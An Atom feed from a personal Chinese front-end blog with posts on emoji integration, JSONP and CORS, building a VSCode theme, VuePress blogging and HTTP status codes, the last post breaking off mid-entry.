<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://hubingliang.github.io</id>
    <title>Gridea</title>
    <updated>2019-06-03T09:19:17.300Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://hubingliang.github.io"/>
    <link rel="self" href="https://hubingliang.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://hubingliang.github.io/images/avatar.png</logo>
    <icon>https://hubingliang.github.io/favicon.ico</icon>
    <rights>All rights reserved 2019, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[如何在你的项目中引入emoji😀]]></title>
        <id>https://hubingliang.github.io/post/emoji</id>
        <link href="https://hubingliang.github.io/post/emoji">
        </link>
        <updated>2019-09-17T06:48:20.000Z</updated>
        <content type="html"><![CDATA[<p>最近在做我们学校的<a href="https://hubingliang.github.io/Confession-wall/dist/">表白墙网站</a>，在做到评论功能的时候自然而然就想到了emoji-😏。
于是就去搜了一些这方面的资料，发现了比较好的三个emoji库：</p>
<ul>
<li><a href="https://github.com/emojione/emojione">emojione</a>（第一个开源且完整的emoji网站，编码方面100%免费，且与项目有非常好的整合性）</li>
<li><a href="https://github.com/twitter/twemoji">Twemoji</a> (完全免费，简单小巧，API相比emojione较少。)</li>
<li><a href="http://ellekasai.github.io/twemoji-awesome/">Twemoji Awesome</a> (Twemoji社区的项目，纯css显示emoji)</li>
</ul>
<p>综合考虑最后选择了emojione来实现，因为API比较多而且文档十分友好。</p>
<h2 id="引入emojione">引入emojione</h2>
<ul>
<li>通过外链</li>
</ul>
<pre><code class="language-html">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/emojione@3.1.2/lib/js/emojione.min.js&quot;&gt;&lt;/script&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/emojione@3.1.2/extras/css/emojione.min.css&quot;/&gt;
</code></pre>
<ul>
<li>NPM</li>
</ul>
<pre><code>&gt; npm install emojione
</code></pre>
<h2 id="生成emoji选择界面">生成emoji选择界面</h2>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-ef3ae78893a558c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>首先我们需要这些emoji的图片，随即我就去<a href="https://www.emojione.com/developers/download">emojione</a>官网下载了32×32px的PNG图片，可是之后我发现图片太多不可能让我一个一个引入吧！</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-21d1a6f7e13a2288.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>转变思路，去看emojione的<a href="https://github.com/emojione/emojione">文档</a>，发现了一个提供API演示功能的[emojione实验室](https://demos.emojione.com/latest/index.html## extras)。</p>
<p>实验室中有一个API可以把HTML中的unicode 转换为图片：<a href="https://demos.emojione.com/latest/jsunicodetoimage.html">.unicodeToImage(str)</a></p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-baca09028eec4ae2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>于是我用JS Bin 做了一个小<a href="http://js.jirengu.com/vupel/2/edit">demo</a>测试了一下,发现没有什么问题。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-2650383b4132fa9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>OK，那么我们就可以通过这个API批量生成emoji的图片了，可是emoji的Unicode码去哪找呢？
官方提供了一个Unicode复制粘贴的网站：<a href="https://www.emojicopy.com/">emojiCOPY</a></p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-a391a9796b5010fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>选中想要的emoji，之后点击COPY就可以复制下来，然后再粘贴到刚才的JS Bin之中就可以批量生成图片了：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-9f47be5f280a88f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>之后把这些图片的HTML直接复制到我们的项目之中：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-45fb81e4f83df1d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>让人惊喜的是这些生成的img的alt是Unicode，这让input显示和用户点击同步也变得简单了。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-19fd42f9cf8aa49b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>接下来只需要写很简单的JS就可以实现了：</p>
<pre><code class="language-js">$('.emoji').children().click((emoji)=&gt; {
    comment = comment + ' ' + emoji.target.alt　+　' '
})
</code></pre>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-c0ae294af0d711b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-64fbd4090a322e38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[跨域方法整理]]></title>
        <id>https://hubingliang.github.io/post/cors</id>
        <link href="https://hubingliang.github.io/post/cors">
        </link>
        <updated>2019-06-03T11:14:47.000Z</updated>
        <content type="html"><![CDATA[<p><img src="https://images.unsplash.com/photo-1547489026-3228fbcb1664?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1200&amp;h=500&amp;fit=crop&amp;ixid=eyJhcHBfaWQiOjF9" alt=""></p>
<h2 id="什么是同源">什么是同源</h2>
<p>为了防止网站被 XSS、CSRF 攻击，Netscape 公司在 1995 年引入同源策略/SOP(Same origin policy),它是指“协议+域名+端口”三者相同。</p>
<h2 id="什么是跨域">什么是跨域</h2>
<p>其实就是在违反了同源策略的情况下请求到资源的行为就是跨域，也就是说当协议、域名、端口号有一个或者多个不同时获取数据就是跨域。</p>
<p>在同源限制下 cookie localStorage dom ajax IndexDB 都不支持跨域。</p>
<p>另外，所谓同源策略并不是说在非同源的情况下服务器不返回数据，而是返回的数据被浏览器拦截了。</p>
<h2 id="跨域的几种实现">跨域的几种实现</h2>
<h3 id="jsonp">jsonp</h3>
<pre><code class="language-js">// 封装 jsonp 跨域请求的方法
function jsonp({ url, params, callBack }) {
    return new Promise((resolve, reject) =&gt; {
        // 创建一个 script 标签帮助我们发送请求
        let script = document.createElement('script')
        let arr = []
        params = { ...params, callBack }

        // 循环构建键值对形式的参数
        for (let key in params) {
            arr.push(`${key}=${params[key]}`)
        }

        // 创建全局函数
        window[callBack] = function(data) {
            resolve(data)
            // 在跨域拿到数据以后将 script 标签销毁
            document.body.removeChild(script)
        }

        // 拼接发送请求的参数并赋值到 src 属性
        script.src = `${url}?${arr.join('&amp;')}`
        document.body.appendChild(script)
    })
}

// 调用方法跨域请求百度搜索的接口
json({
    url: 'https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su',
    params: {
        wd: 'jsonp',
    },
    callBack: 'show',
}).then((data) =&gt; {
    // 打印请求回的数据
    console.log(data)
})
</code></pre>
<p><strong>缺点：</strong></p>
<ul>
<li>只支持 get</li>
<li>不安全，容易引发 xss 攻击，别人有可能在返回的结果中返回恶意代码</li>
</ul>
<h3 id="cors">CORS</h3>
<p>跨源资源共享/CORS（Cross-Origin Resource Sharing）是 W3C 的一个工作草案，定义了在必须访问跨源资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
<p>浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>简单请求必须要满足两个条件：</p>
<ol>
<li>请求方法：</li>
</ol>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<ol start="2">
<li>HTTP 头信息不超出以下字段</li>
</ol>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何打造一款自己的 VSCode 主题？]]></title>
        <id>https://hubingliang.github.io/post/vscode-theme</id>
        <link href="https://hubingliang.github.io/post/vscode-theme">
        </link>
        <updated>2019-04-18T09:21:54.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>本文首发于个人博客</p>
</blockquote>
<p>我之前一直用 <strong>One Dark Pro</strong> 后来又转到 <strong>Material Theme Palenight</strong> 再到后来的 <strong>Dracula</strong> 。总觉得有些配色很奇怪（工作太闲），于是写了一个 VSCode 深色主题：<a href="https://github.com/hubingliang/Duang">Duang</a>，之所以叫Duang是因为它很黑，很亮，很柔....</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a30374038ac5db?w=446&amp;h=315&amp;f=jpeg&amp;s=36465" alt=""></p>
<p><a href="https://marketplace.visualstudio.com/items?itemName=Brownhu.duang">大家可以在这下载体验</a></p>
<p><a href="https://github.com/hubingliang/Duang">github 在这里</a></p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a303c83daf3bb6?w=1514&amp;h=450&amp;f=png&amp;s=107690" alt=""></p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a3062d5015d575?w=1920&amp;h=1057&amp;f=png&amp;s=327708" alt=""></p>
<p>如果你也对编辑器有自己独特风格的偏好，但是在成千上万款主题中又没有一款主题完全符合你的口味，那么跟着下面的流程我们自己动手做一个完全符合自己风格的主题吧。</p>
<hr>
<h2 id="注册你的开发者帐号和配置-token">注册你的开发者帐号和配置 token</h2>
<p>如果你安装过其他的 VSCode 主题的话应该知道，所有主题都属于 VSCode插件。那么要开发插件，必不可少的工具就是 <a href="https://github.com/Microsoft/vscode-vsce">vsce</a>，这个是官方管理插件的工具，所有插件都通过这个工具来发布。</p>
<p>如果你英文够好，建议看 VSCode 官网的这篇<a href="https://code.visualstudio.com/api/working-with-extensions/publishing-extension">文章</a>来学习从申请账号到发布插件的整个流程，非常详细。当然也可以跟着我后面的流程一起。</p>
<p>首先全局安装 <strong>vsce</strong> :</p>
<pre><code>npm install -g vsce
</code></pre>
<p>之后你需要去注册一个账号，网址在这：<a href="https://azure.microsoft.com/zh-cn/services/devops/">Azure DevOps Services | Microsoft Azure</a></p>
<p>登陆之后，首先新建一个 <strong>public</strong> 项目:</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fc45a7e1f7c1?w=627&amp;h=550&amp;f=png&amp;s=40656" alt=""></p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fbc998050c96?w=1492&amp;h=925&amp;f=png&amp;s=207120" alt=""></p>
<p>然后获取你的 <strong>Personal access tokens</strong> ，点击右上角的头像，点击 <strong>Security</strong>。</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fc9eafaf6678?w=233&amp;h=279&amp;f=png&amp;s=13476" alt=""></p>
<p>为你的 <strong>token</strong> 指定一个名称，时间的话最长到期可以设置为一年。</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fcf53e722c4a?w=1509&amp;h=1004&amp;f=png&amp;s=192787" alt=""></p>
<p>点击查看所有的配置项，找到 <strong>Marketplace</strong> 并选择 <strong>Acquire</strong> and <strong>Manage</strong>：</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fd0406d2c348?w=1510&amp;h=1005&amp;f=png&amp;s=192921" alt=""></p>
<p>点击 <strong>Create</strong> ，复制生成的 <strong>token</strong>，之后就要用到我们刚才安装的 <strong>vsce</strong> 来创建新的发布者（publisher）</p>
<pre><code>vsce create-publisher (发布者的名字)
</code></pre>
<p>回车之后会依次提示输入<strong>name</strong>、<strong>email</strong>，和你刚刚复制的 <strong>token</strong>。</p>
<p>现在你可以通过下面这个命令来登陆:</p>
<pre><code>vsce login (发布者的名字)
</code></pre>
<p>到此为止我们第一步就完成了，不要觉得繁琐，因为这些我们只需要配置一次就好了，每次开发插件的时候都不用重复这些操作。</p>
<p>如果你遇到文中没有提到的问题，我继续建议你看官方这两篇文章</p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/azure/devops/organizations/accounts/create-organization?view=azure-devops">创建账号</a></li>
<li><a href="https://code.visualstudio.com/api/working-with-extensions/publishing-extension">发布扩展</a></li>
</ul>
<hr>
<h2 id="用脚手架生成基本的插件代码">用脚手架生成基本的插件代码</h2>
<p>之后我们需要安装一个脚手架工具：</p>
<pre><code>npm install -g yo generator-code
</code></pre>
<p>然后运行下面的命令👇，它可以在任何目录中生成一套基本的插件代码：</p>
<pre><code>yo code
</code></pre>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fe0fab9fb691?w=1060&amp;h=916&amp;f=png&amp;s=258431" alt=""></p>
<p>我们要开发一个主题，所以选中 <strong>New Color Theme</strong>，之后会继续询问你是否新建主题还是从现有主题导入，我们这里选创建一个全新的。</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a2fe3e4302080e?w=2022&amp;h=184&amp;f=png&amp;s=116013" alt=""></p>
<p>之后还会问你一些问题：</p>
<ul>
<li>插件名字</li>
<li>标识符</li>
<li>描述 （这个后面可以在<strong>package.json</strong>里面改）</li>
<li>发布者的名字 (见前文)</li>
<li>对于用户这个插件的名字</li>
<li>这个主题是dark还是light还是高对比度</li>
</ul>
<p>之后就会为我们生成一套主题插件的基本代码，到此为止我们已经完成了80%了，剩下的就只需要更改生成目录 <strong>themes</strong> 下的 <strong>json</strong> 文件就可以了，但是....</p>
<hr>
<h2 id="修改themes下的json文件">修改themes下的json文件</h2>
<p>看似很简单的事情，其实是我认为最难的，因为要设计一款，好看的主题，配色真的太难了！！！</p>
<p>很多我以为会很好看的颜色，改进去却like a shit....</p>
<p>em.....扯远了</p>
<p>首先用 VSCode 打开生成的目录，我们看到结构如下：</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a3009f1663e799?w=4096&amp;h=3072&amp;f=jpeg&amp;s=654365" alt="221555584047_.pic_hd.jpg"></p>
<p>之后我们的工作都会在 <strong>themes</strong> 下的 <strong>json</strong> 文件展开，不要害怕，我们其实不需要看完这几百上千行 json 文件的意思。</p>
<p>首先我们先进去调试模式，看看脚本自动生成的主题是什么样子的：</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a300dbfbd72558?w=2048&amp;h=1536&amp;f=png&amp;s=366435" alt=""></p>
<p>点击调试，会自动打开一个新的 VSCode 窗口展示预设的主题。</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a301018c9aec7d?w=2772&amp;h=1754&amp;f=png&amp;s=633003" alt=""></p>
<p>接下来 <strong>Command + Shift + P</strong> 输入 <strong>Developer: Inspect TM Scopes</strong></p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a30132c4f482c7?w=1190&amp;h=1094&amp;f=png&amp;s=165318" alt=""></p>
<p>现在你可以看文件中每一个字符的颜色配置在哪了，只需要在 json 文件里搜对应的配置就好了。</p>
<p>如果你觉得不习惯，你甚至可以打开和 <strong>Chrome</strong> 一样的开发者工具，快捷键是 <strong>option + command + i</strong></p>
<p><img src="https://user-gold-cdn.xitu.io/2019/4/18/16a3015c6f12955f?w=3840&amp;h=2114&amp;f=png&amp;s=2290633" alt=""></p>
<p>不过我还是建议你用第一种方法，因为开发者工具有时候搜到颜色，但是你找不到配置项。</p>
<hr>
<h2 id="配色方案">配色方案</h2>
<p>如果你现在一无所措，改了一些颜色也不尽如人意，那就看下我的配色建议：</p>
<p>首先我的建议是，直接抄你喜欢或者成熟主题对应的 <strong>json</strong>文件，比如 <strong>One Dark Pro</strong> 、<strong>Material Theme Palenight</strong>、<strong>Dracula</strong></p>
<p>之所以这样是因为出于几个考虑：</p>
<ol>
<li>脚手架的配置项并不齐全，比如底部状态栏和侧边栏甚至光标的颜色都没有，而比较成熟下载量多的主题边边角角都配置到了，我们拿过来把对应的颜色全局替换就好了，不用再去官网上找对应的配置项。</li>
<li>并不是每种类型的字符配一种颜色，很多类型是复用同一种颜色的，但是对应关系并不好找，所以如果我们看到一个改一个很容易改的乱七八糟，所以拷贝过来之后每次改颜色，<strong>一定要全局替换，不要只改一个</strong>！！！</li>
<li>因为之前可能有了喜欢的主题，只不过主题之中有一些元素不喜欢而已，这样也会省下很多工作量。</li>
<li>你可以借鉴一些主题的颜色，或者整体风格，由于都在json文件里面，你可以很方便的找到它。</li>
</ol>
<p>那么问题来了，那些主题的 <strong>json</strong> 文件我去哪里找呢？</p>
<p><a href="https://vscodethemes.com/">这里</a>有几乎所有有名的 VSCode 主题，你可以点开看它的 <strong>github</strong> 那里就有它们的 <strong>json</strong> 文件，你可以clone整个项目，也可以单单只复制 <strong>json</strong> 。</p>
<p><strong>注意，不要全部复制过来，只复制 <strong>colors</strong> 和 <strong>tokenColors</strong> 就可以了。</strong></p>
<hr>
<p>至于颜色的选取这里推荐几个网站，供大家参考：</p>
<ol>
<li><a href="http://jxnblk.com/colorable/demos/text/">Colorable</a></li>
<li><a href="http://colorsafe.co/">colorsafe</a></li>
<li><a href="https://color.adobe.com/zh/create">Adobe Color CC</a></li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://hubingliang.github.io/post/hello-gridea</id>
        <link href="https://hubingliang.github.io/post/hello-gridea">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="http://hvenotes.fehey.com/">Gridea 主页</a><br>
<a href="http://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>𝖶𝗂𝗇𝖽𝗈𝗐𝗌</strong> 或 <strong>𝖬𝖺𝖼𝖮𝖲</strong> 设备上使用此客户端</p>
<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hexo已经看腻了，来试试VuePress搭建个人博客]]></title>
        <id>https://hubingliang.github.io/post/vuepress</id>
        <link href="https://hubingliang.github.io/post/vuepress">
        </link>
        <updated>2018-04-23T09:17:23.000Z</updated>
        <content type="html"><![CDATA[<p><img src="https://user-gold-cdn.xitu.io/2018/4/23/162f21a0e09d9fd3?w=600&amp;h=600&amp;f=png&amp;s=160672" alt=""></p>
<h2 id="vuepress">VuePress</h2>
<p>先简单介绍一下VuePress，这是尤大在2018年4月份发布的一个新轮子。</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/4/23/162f21add3603e86?w=751&amp;h=418&amp;f=png&amp;s=63447" alt=""></p>
<p>一个基于 Vue SSR 的静态站生成器，本来的目的是爽爽的写文档，但是我发现用来撸一个人博客也非常不错。</p>
<p><strong><a href="https://vuepress.vuejs.org/">这是VuePress的官方文档</a></strong>
<strong><a href="https://vuepress.docschina.org/">这是VuePress的中文文档</a></strong></p>
<h2 id="上手搭建">上手搭建</h2>
<p>你可以跟着文档上的例子自己玩一玩，不过由于VuePress的文档也是用VuePress来实现的，所以我取巧直接拿<a href="https://github.com/vuejs/vuepress">VuePress仓库</a>中的<strong>docs</strong>目录拿来玩耍。</p>
<ol>
<li>首先安装VuePress到全局</li>
</ol>
<pre><code class="language-bash">npm install -g vuepress
</code></pre>
<ol start="2">
<li>然后把VuePress仓库克隆到你的电脑</li>
</ol>
<pre><code class="language-bash">git clone git@github.com:docschina/vuepress.git
</code></pre>
<ol start="3">
<li>在docs文件中执行（请确保你的 Node.js 版本 &gt;= 8）</li>
</ol>
<pre><code class="language-bash">cd vuepress
cd docs
vuepress dev
</code></pre>
<p>当你看到这一行就说明已经成功了：</p>
<pre><code> VuePress dev server listening at http://localhost:8080/
</code></pre>
<p>下面我们打开<a href="http://localhost:8080/">http://localhost:8080/</a>
发现真的打开了vuepress文档：
<img src="https://user-gold-cdn.xitu.io/2018/4/23/162f21a0e0944215?w=1240&amp;h=520&amp;f=png&amp;s=69295" alt=""></p>
<p>下面的工作就是数据的替换了，但我们应该先看一下docs的目录结构：</p>
<pre><code>├─.vuepress
│  ├─components
│  └─public
│      └─icons
│   └─config.js // 配置文件
├─config // Vuepress文档的配置参考内容
├─default-theme-config // Vuepress文档的默认主题配置内容
├─guide // Vuepress文档的指南内容
└─zh // 中文文档目录
    ├─config
    ├─default-theme-config
    └─guide
└─README.md // 首页配置文件
</code></pre>
<p>文档分成了两部分，中文文档在/zh/目录下，英文文档在根目录下。</p>
<p>其实目录里面的东西都挺好看懂的，首先guide 、default-theme-config、config 这三个目录中的都是Vuepress文档的主要内容，从中文文档里也可以看到只有这三个目录被替换了。</p>
<h2 id="首页配置">首页配置</h2>
<p>默认主题提供了一个主页布局，要使用它，需要在你的根目录 <code>README.md</code> 的 <a href="https://vuepress.docschina.org/guide/markdown.html#yaml-front-matter">YAML front matter</a> 中指定 <code>home：true</code>，并加上一些其他的元数据。</p>
<p>我们先看看根目录下的README,md：</p>
<pre><code>home: true // 是否使用Vuepress默认主题
heroImage: /hero.png // 首页的图片
actionText: Get Started →  // 按钮的文字
actionLink: /guide/ // 按钮跳转的目录
features: // 首页三个特性
- title: Simplicity First
  details: Minimal setup with markdown-centered project structure helps you focus on writing.
- title: Vue-Powered
  details: Enjoy the dev experience of Vue + webpack, use Vue components in markdown, and develop custom themes with Vue.
- title: Performant
  details: VuePress generates pre-rendered static HTML for each page, and runs as an SPA once a page is loaded.
footer: MIT Licensed | Copyright © 2018-present Evan You // 页尾
</code></pre>
<p>实在看不懂，<a href="https://vuepress.docschina.org/default-theme-config/">官网</a>有比我更详细的配置说明。</p>
<h2 id="导航配置">导航配置</h2>
<p>导航配置文件在<code>.vuepress/config.js</code>中</p>
<p>在导航配置文件中nav是控制导航栏链接的，你可以把它改成自己的博客目录。</p>
<pre><code class="language-js">nav: [
    {
        text: 'Guide',
        link: '/guide/',
    },
    {
        text: 'Config Reference',
        link: '/config/'
    },
    {
        text: 'Default Theme Config',
        link: '/default-theme-config/'
    }
]
</code></pre>
<p>剩下的默认主题配置官方文档都有很详细的文档说明这里就不在啰嗦了。</p>
<h2 id="更改默认主题色">更改默认主题色</h2>
<p>你可以在<code>.vuepress/</code>目录下创建一个<code>override.styl</code>文件。
vuepress提供四个可更改的颜色：</p>
<pre><code>$accentColor = #3eaf7c // 主题色
$textColor = #2c3e50 // 文字颜色
$borderColor = #eaecef // 边框颜色
$codeBgColor = #282c34 // 代码背景颜色
</code></pre>
<p>我把它改成了这样：
<img src="https://user-gold-cdn.xitu.io/2018/4/23/162f21a0e07ec947?w=1240&amp;h=698&amp;f=png&amp;s=138334" alt=""></p>
<h2 id="侧边栏的实现">侧边栏的实现</h2>
<p>由于评论区里问的人较多，所以在这里更新一下，其实我就算在这里写的再详细也不如大家去看官方文档。
侧边栏的配置也在<code>.vuepress/config.js</code>中：</p>
<pre><code>sidebar: [
  {
    title: 'JavaScript', // 侧边栏名称
    collapsable: true, // 可折叠
    children: [
      '/blog/JavaScript/学会了ES6，就不会写出那样的代码', // 你的md文件地址
    ]
  },
  {
    title: 'CSS', 
    collapsable: true,
    children: [
      '/blog/CSS/搞懂Z-index的所有细节',
    ]
  },
  {
    title: 'HTTP',
    collapsable: true,
    children: [
      '/blog/HTTP/认识HTTP-Cookie和Session篇',
    ]
  },
]
</code></pre>
<p>对应的文档结构：</p>
<pre><code>├─blog // docs目录下新建一个博客目录
│  ├─CSS
│  ├─HTTP
│  └─JavaScript
</code></pre>
<p>我的博客：<a href="http://brownhu.site/">brownhu</a></p>
<h2 id="部署">部署</h2>
<p>在配置好你博客之后，命令行执行：</p>
<pre><code class="language-bash">Vuepress build
</code></pre>
<p>当你看到这一行就说明成功了：</p>
<pre><code>Success! Generated static files in vuepress.
</code></pre>
<p>将打包好的vuepress目录上传到你的github仓库，和github page配合，就可以配置好你的博客网站了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[认识HTTP----状态码]]></title>
        <id>https://hubingliang.github.io/post/status-code</id>
        <link href="https://hubingliang.github.io/post/status-code">
        </link>
        <updated>2017-10-28T05:57:41.000Z</updated>
        <content type="html"><![CDATA[<p><strong>本文内容大多参考<a href="https://book.douban.com/subject/25863515/">《图解HTTP》一书</a></strong></p>
<h2 id="什么是状态码">什么是状态码？</h2>
<p>当我们向服务端发送请求的时候，为了让用户更好的理解返回结果，通常要借助状态码来通知用户服务器端是正常处理了请求，还是出现了偏差。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-58f1c4215d05ea95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="响应的状态码可描述请求的处理结果"></p>
<p><strong>状态码如200 OK，以3 位数字和原因短语组成。</strong>
<strong>数字中的第一位指定了响应类别，后两位无分类。响应类别有以下5 种。</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-bf822bc144edc3e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>状态码数量繁多，实际经常使用只有14多种，下面只介绍一下具有代表性的14 个状态码。</p>
<h2 id="2xx-成功">2XX 成功</h2>
<p>2XX 的响应结果表明请求被正常处理了。</p>
<h3 id="200-ok">200 OK</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-61676b0654a08ac5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>表示从客户端发来的请求在服务器端被正常处理了。</p>
<h3 id="204-no-content">204 No Content</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-f9d6fbcced90d307.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回204 响应，那么浏览器显示的页面不发生更新。
一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用。</p>
<h3 id="206-partial-content">206 Partial Content</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-3026ffedffa36572.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET 请求。响应报文中包含由Content-Range 指定范围的实体内容。</p>
<h2 id="3xx重定向">3XX重定向</h2>
<p>3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。</p>
<h3 id="301-moved-permanently">301 Moved Permanently</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-b1345d016e324c54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应使用资源现在所指的URI。</p>
<h3 id="302-found">302 Found</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-da317dbc465ef206.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>临时性重定向。该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI 访问。
和301 Moved Permanently 状态码相似，但302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URI 将来还有可能发生改变。</p>
<h3 id="303-see-other">303 See Other</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-42dfb7ef295639d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。
303 状态码和302 Found 状态码有着相同的功能，但303 状态码明确表示客户端应当采用GET 方法获取资源，这点与302 状态码有区别。
比如，当使用POST 方法访问CGI 程序，其执行后的处理结果是希望客户端能以GET 方法重定向到另一个URI 上去时，返回303 状态码。虽然302 Found 状态码也可以实现相同的功能，但这里使用303 状态码是最理想的。</p>
<h3 id="304-not-modified">304 Not Modified</h3>
<p><img src="http://upload-images.jianshu.io/upload_images/4337988-e014430e6b091447.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="">
